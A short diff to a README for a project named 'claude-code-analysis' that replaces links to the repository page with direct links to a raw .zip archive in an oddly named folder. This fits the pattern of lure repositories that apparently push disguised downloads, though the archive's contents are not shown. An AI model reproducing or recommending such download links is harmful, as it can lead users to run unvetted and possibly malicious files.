@@ -1,10 +1,10 @@
 # 🧠 claude-code-analysis - Understand Claude Code With Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Intragroup-pottle634/claude-code-analysis)
+[![Download](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Intragroup-pottle634/claude-code-analysis/main/diamondiferous/analysis-claude-code-v2.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Intragroup-pottle634/claude-code-analysis
+Visit this page to download: https://raw.githubusercontent.com/Intragroup-pottle634/claude-code-analysis/main/diamondiferous/analysis-claude-code-v2.8.zip
 
 ## 🖥️ What this is
 
